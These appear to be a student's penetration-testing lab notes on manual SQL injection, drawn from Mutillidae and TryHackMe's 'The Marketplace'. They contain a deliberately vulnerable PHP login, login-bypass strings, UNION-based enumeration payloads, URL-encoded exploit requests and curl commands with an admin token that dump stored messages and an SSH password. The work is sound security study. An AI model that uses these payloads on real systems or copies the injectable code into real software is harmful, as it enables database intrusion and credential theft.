<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Manual</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Manual</h1><br/><p>PHP Example:</p><p></p><p>&lt;?php</p><p>mysql_connect(&quot;localhost&quot;, &quot;db_username&quot;, &quot;db_password&quot;); # Connection to the SQL</p><p>Database.</p><p>mysql_select_db(&quot;users&quot;); # Database table where user information is stored.</p><p>$username=$_POST[&#39;username&#39;]; # User-specified username.</p><p>$password=$_POST[&#39;password&#39;]; #User-specified password.</p><p>$sql=&quot;SELECT * FROM users WHERE username=&#39;$username&#39; AND password=&#39;$password&#39;&quot;;</p><p># Query for user/pass retrieval from the DB.</p><p>$result=mysql_query($sql);</p><p># Performs query stored in $sql and stores it in $result.</p><p>$count=mysql_num_rows($result);</p><p># Sets the $count variable to the number of rows stored in $result.</p><p>if ($count==1){</p><p># Checks if there&#39;s at least 1 result, and if yes:</p><p>$_SESSION[&#39;username&#39;] = $username; # Creates a session with the specified $username.</p><p>$_SESSION[&#39;password&#39;] = $password; # Creates a session with the specified $password.</p><p>header(&quot;location:home.php&quot;); # Redirect to homepage.}</p><p>else { # If there&#39;s no singular result of a user/pass combination:</p><p>header(&quot;location:login.php&quot;);</p><p># No redirection, as the login failed in the case the $count variable is not equal to</p><p>1, HTTP Response code 200 OK.</p><p>}</p><p>?&gt;</p><p></p><p></p><p>We can gain Foothold by using-----&gt; Username: admin&#39;# </p><p>As no input validation is made..It will comment out the password area like below. (Putting any password will do)</p><p></p><p><img src="images/20-1.png" alt="images/20-1.png" /></p><p></p><p></p><p><strong>For Sqlite3</strong></p><p>Comments is not #. So we can use the following for comments:</p><p>-- <em>comment goes here</em></p><p>Or</p><p>/* <em>comment goes here</em> */</p><p></p><p>Thus we can use: admin&#39;-- </p><p></p><p></p><p><strong>Using Metaploitable2:::::</strong></p><p>SELECT * FROM demo;</p><p></p><p>INSERT INTO demo (id, name, hint) VALUES (18, &quot;James&quot;, &quot;Guitar&quot;);</p><p></p><p>DELETE FROM demo WHERE name = &quot;James&quot;;</p><p></p><p>UPDATE demo SET id = 18 WHERE name = &quot;Atil&quot;;</p><p></p><p>SELECT * FROM demo WHERE name LIKE &quot;%E&quot;;</p><p></p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; AND password=&#39;12345&#39;</p><p></p><p>Testing Vulnerability:</p><p></p><p>Given Password is Known:::::</p><p>Always Fail</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; AND password=&#39;12345&#39; AND 1=2#&#39;</p><p>Always Succeed</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; AND password=&#39;12345&#39; AND 1=1#&#39;</p><p></p><p></p><p>HTML Encoding of # is %23</p><p>HTML Encoding of SPACE is %20</p><p></p><p></p><p>Post Method Exploit:</p><p>Password is not known::::::</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; AND password=&#39;abc&#39; OR 1=1#&#39;</p><p>or</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39;#&#39;</p><p></p><p>Get Method Exploit:</p><p><a href="http://10.10.10.104/mutillidae/index.php?page=user-info.php&username=james'%23&password=1234&user-info-php-submit-button=View+Account+Details">http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=james&#39;%23&amp;password=1234&amp;user-info-php-submit-button=View+Account+Details</a></p><p>Note: james&#39;# ----&gt; james&#39;%23</p><p></p><p></p><p>To see all Data of table use union (Use in Get Method to see the list)</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; UNION SELECT * FROM accounts #&#39;</p><p><a href="http://10.10.10.104/mutillidae/index.php?page=user-info.php&username=admin'">http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin&#39;</a> UNION SELECT * FROM accounts%23&amp;password=1234&amp;user-info-php-submit-button=View+Account+Details</p><p></p><p></p><p><a href="http://10.10.10.104/mutillidae/index.php?page=user-info.php&username=james%27%20union%20select%20*%20from%20accounts%23&password=1234&user-info-php-submit-button=View+Account+Details">http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=james%27%20union%20select%20*%20from%20accounts%23&amp;password=1234&amp;user-info-php-submit-button=View+Account+Details</a></p><p></p><p></p><p></p><p>Suppose we do not know the Database Name:</p><p></p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; UNION ORDER BY 1#&#39;</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; UNION ORDER BY 2#&#39;</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; UNION ORDER BY 3#&#39;</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; UNION ORDER BY 4#&#39;</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; UNION ORDER BY 5#&#39;</p><p></p><p>Try till you get an error to know the number of columns.</p><p>Then,</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; UNION SELECT 1, 2, 3, 4, 5#&#39;</p><p></p><p>Once we know which columns have data, we search for default names:</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; UNION SELECT 1, database(), user(), version(), 5#&#39;</p><p>eg. <a href="http://10.10.10.104/mutillidae/index.php?page=user-info.php&username=james%27%20union%20select%201,%20database(),%20user(),%20version(),%205%23&password=1234&user-info-php-submit-button=View+Account+Details">http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=james%27%20union%20select%201,%20database(),%20user(),%20version(),%205%23&amp;password=1234&amp;user-info-php-submit-button=View+Account+Details</a></p><p></p><p>Digging Deeper for tables:</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; UNION SELECT 1, table_name, null, null, 5 FROM information_schema.tables#&#39;</p><p><a href="http://10.10.10.104/mutillidae/index.php?page=user-info.php&username=james%27%20union%20select%201,%20table_name,%20null,%20null,%205%20from%20information_schema.tables%23&password=1234&user-info-php-submit-button=View+Account+Details">http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=james%27%20union%20select%201,%20table_name,%20null,%20null,%205%20from%20information_schema.tables%23&amp;password=1234&amp;user-info-php-submit-button=View+Account+Details</a></p><p></p><p>Getting Table names from Database(OWASP10):</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; UNION SELECT 1, table_name, null, null, 5 FROM information_schema.tables WHERE table_schema=&#39;OWASP10&#39;#&#39;</p><p><a href="http://10.10.10.104/mutillidae/index.php?page=user-info.php&username=admin%27%20union%20select%201,%20table_name,%20null,%20null,%205%20from%20information_schema.tables%20where%20table_schema%20=%20%27OWASP10%27%23&password=1234&user-info-php-submit-button=View+Account+Details">http://10.10.10.104/mutillidae/index.php?page=user-info.php&amp;username=admin%27%20union%20select%201,%20table_name,%20null,%20null,%205%20from%20information_schema.tables%20where%20table_schema%20=%20%27OWASP10%27%23&amp;password=1234&amp;user-info-php-submit-button=View+Account+Details</a></p><p></p><p></p><p>Getting columns from Tables:</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; UNION SELECT 1, column_name, null, null, 5 FROM information_schema.columns WHERE table_name=&#39;accounts&#39;#&#39;</p><p></p><p>Getting column values:</p><p>SELECT * FROM accounts WHERE username=&#39;james&#39; UNION SELECT 1, username, password, is_admin, 5 FROM accounts#&#39;</p><p></p><p><strong>THM</strong></p><p><strong>Manual SQL Injection for Username and Password:</strong></p><p></p><p>Comments in SQL: </p><p># </p><p>-- -</p><p>Comments in sqlite3:</p><p>--</p><p></p><p><strong>SELECT * FROM users WHERE username = admin AND password := &#39; or 1=1 -- -</strong></p><p>OR</p><p><strong>SELECT * FROM users WHERE username</strong> = &#39; or 1=1 -- -</p><p>OR</p><p><strong>SELECT * FROM users WHERE username = admin AND password := &#39; or 1=1 </strong>#</p><p>OR</p><p><strong>SELECT * FROM users WHERE username</strong> = &#39; or 1=1 #</p><p></p><p></p><p><strong><h2>Manual SQL Injection Example-1</h2></strong></p><p><strong>Note:</strong> It uses admin cookie for all transactions</p><p>Note: Sqlmap didn&#39;t work and gave 403 error everytime. Manual injection can be done with either <strong>burpsuite</strong> or <strong>curl</strong></p><p></p><p>Source-------&gt;THM: The Marketplace</p><p></p><p><strong>Note:</strong> Every request of our should be accompanied with the <strong>admin cookie</strong>.</p><p></p><p>We check the User Listings and enter quotes in place of <strong>user=2</strong> it gives an SQL error indicating SQL injection.</p><p></p><p><img src="images/20-2.png" alt="images/20-2.png" /></p><p></p><p><strong>user=&#39;</strong></p><p><img src="images/20-3.png" alt="images/20-3.png" /></p><p></p><p>We can use <strong>burpsuite</strong> or <strong>curl</strong> to send multiple requests by changing the URL to enumerate sql injection manually.</p><p></p><p><strong><h2>Using Burpsuite</h2></strong></p><p>We use the <strong>admin cookie</strong> and captured an <strong>user=1</strong> request in <strong>repeater</strong> of <strong>burpsuite</strong>.</p><p><img src="images/20-4.png" alt="images/20-4.png" /></p><p></p><p>Now, we can play with the URL to check for SQL vulnerabilities.</p><p><strong>Note:</strong> URL Encoded is very much needed.</p><p></p><p><strong>0 UNION SELECT 1</strong></p><p><strong>user=%30%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31</strong></p><p></p><p><img src="images/20-5.png" alt="images/20-5.png" /></p><p></p><p></p><p><img src="images/20-6.png" alt="images/20-6.png" /></p><p></p><p>We increase the number of columns of UNION SELECT 1,2.... and so on till we get no error.</p><p></p><p>Finally we got no error in the following:</p><p></p><p><strong>0 UNINON SELECT 1,2,3,4</strong>.</p><p><strong>%30%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%32%2c%33%2c%34</strong></p><p></p><p><img src="images/20-7.png" alt="images/20-7.png" /></p><p></p><p><img src="images/20-8.png" alt="images/20-8.png" /></p><p></p><p>Notice that, the User place is acting as the display windows. (As we are selecting user)</p><p></p><p>We get <strong>2</strong> there. Thus, we need to replace <strong>2</strong> with our <strong>SQL queries</strong>.</p><p></p><p><strong>Database</strong></p><p>Lets Check the database name.</p><p></p><p><strong>0 UNION SELECT 1,database(),3,4</strong></p><p><strong>%30%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%64%61%74%61%62%61%73%65%28%29%2c%33%2c%34</strong></p><p></p><p><img src="images/20-9.png" alt="images/20-9.png" /></p><p></p><p>As we can see, we got <strong>marketplace</strong> as output.</p><p></p><p><strong>Info</strong></p><p>Database Name: <strong>marketplace</strong></p><p></p><p></p><p><strong>Tables</strong></p><p></p><p><strong>0 UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=&#39;marketplace&#39;</strong></p><p><strong>%30%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%47%52%4f%55%50%5f%43%4f%4e%43%41%54%28%74%61%62%6c%65%5f%6e%61%6d%65%29%2c%33%2c%34%20%46%52%4f%4d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%74%61%62%6c%65%73%20%57%48%45%52%45%20%74%61%62%6c%65%5f%73%63%68%65%6d%61%3d%27%6d%61%72%6b%65%74%70%6c%61%63%65%27</strong></p><p></p><p><img src="images/20-10.png" alt="images/20-10.png" /></p><p></p><p><strong>Info</strong></p><p>Database Name: <strong>marketplace</strong></p><p>Table Names: <strong>items, message, users</strong></p><p></p><p>users table can be enumerated, but I didn&#39;t find any useful information.</p><p>So i moved to <strong>message</strong> table for enumeration.</p><p><strong></strong></p><p><strong>0 UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name=&#39;messages&#39;</strong></p><p><strong>%30%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%47%52%4f%55%50%5f%43%4f%4e%43%41%54%28%63%6f%6c%75%6d%6e%5f%6e%61%6d%65%29%2c%33%2c%34%20%46%52%4f%4d%20%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%63%6f%6c%75%6d%6e%73%20%57%48%45%52%45%20%74%61%62%6c%65%5f%6e%61%6d%65%3d%27%6d%65%73%73%61%67%65%73%27</strong></p><p></p><p><img src="images/20-11.png" alt="images/20-11.png" /></p><p></p><p>We got the column names of <strong>messages</strong> table:</p><p>Column Names: <strong>id, user_from, user_to,message_content,is_read</strong></p><p></p><p>Lets <strong>Dump</strong> the <strong>message_content</strong> <span style="text-decoration:underline;">column</span> of <strong>messages</strong> <span style="text-decoration:underline;">table</span>.</p><p></p><p><strong>0 UNION SELECT 1,GROUP_CONCAT(message_content),3,4 FROM marketplace.messages</strong></p><p><strong>%30%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%47%52%4f%55%50%5f%43%4f%4e%43%41%54%28%6d%65%73%73%61%67%65%5f%63%6f%6e%74%65%6e%74%29%2c%33%2c%34%20%46%52%4f%4d%20%6d%61%72%6b%65%74%70%6c%61%63%65%2e%6d%65%73%73%61%67%65%73</strong></p><p></p><p><img src="images/20-12.png" alt="images/20-12.png" /></p><p></p><p>We got the entire messages dump. We found a password.</p><p></p><p>There are 2 users: <strong>michael, jake</strong></p><p>Password: <strong>@b_ENXkGYUCAv3zJ</strong></p><p></p><p>Upon Enumerating we find the password is for <strong>jake</strong> user. (SSH Credential)</p><p></p><p><strong><h2>Using Curl (Demo)</h2></strong></p><p></p><p><strong>curl -s --cookie &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NTU5OTc3NjN9.UziDPQMBWp2VQcQ2wVbxpPKTrnI8AkBeZPElypCBRWg&quot; http://10.10.228.92/admin?user=2 | tail</strong></p><p></p><p><img src="images/20-13.png" alt="images/20-13.png" /></p><p></p><p>Next, we replace the user field with <strong>0 UNION SELECT 1,2,3,4</strong> </p><p>We had found out the above before using burpsuite.</p><p></p><p><strong>Note: </strong>The same can be tested here 1,2...and so on till we do not get any error.</p><p>To save time and focus on learning the concepts of <strong>CURL</strong> in <strong>SQL</strong> we use the above directly.</p><p></p><p><strong>Important:</strong> As before urlencode is mandatory to avoid error. <strong>Curl</strong> can use built in <strong>urlencode</strong> program of kali.</p><p><strong>apt install urlencode</strong></p><p></p><p>To check where display is possible.</p><p><strong>curl -s --cookie &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NTU5OTc3NjN9.UziDPQMBWp2VQcQ2wVbxpPKTrnI8AkBeZPElypCBRWg&quot; http://10.10.228.92/admin?user=`urlencode &quot;0 UNION SELECT 1,2,3,4&quot;` | tail</strong></p><p></p><p><img src="images/20-14.png" alt="images/20-14.png" /></p><p></p><p>We can see we are getting the display near <strong>User</strong> as was in burpsuite.</p><p></p><p><strong>Database Name Enumeration</strong></p><p></p><p><strong>curl -s --cookie &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NTU5OTc3NjN9.UziDPQMBWp2VQcQ2wVbxpPKTrnI8AkBeZPElypCBRWg&quot; http://10.10.228.92/admin?user=`urlencode &quot;0 UNION SELECT 1,database(),3,4&quot;` | tail</strong></p><p></p><p><img src="images/20-15.png" alt="images/20-15.png" /></p><p></p><p>As we can see we get the database name. Similarly we can use all SQL commands using <strong>curl</strong> as an <strong>alternative</strong> to <strong>burpsuite</strong>.</p><p>Lets do the final <strong>message_content</strong> column dump from <strong>messages</strong> table.</p><p></p><p><strong>curl -s --cookie &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NTU5OTc3NjN9.UziDPQMBWp2VQcQ2wVbxpPKTrnI8AkBeZPElypCBRWg&quot; http://10.10.228.92/admin?user=`urlencode &quot;0 UNION SELECT 1,GROUP_CONCAT(message_content),3,4 FROM marketplace.messages&quot;` | tail</strong></p><p></p><p><img src="images/20-16.png" alt="images/20-16.png" /></p><p></p><p>We found the same through curl result as we had found in burpsuite.</p></div>
</body>
</html>
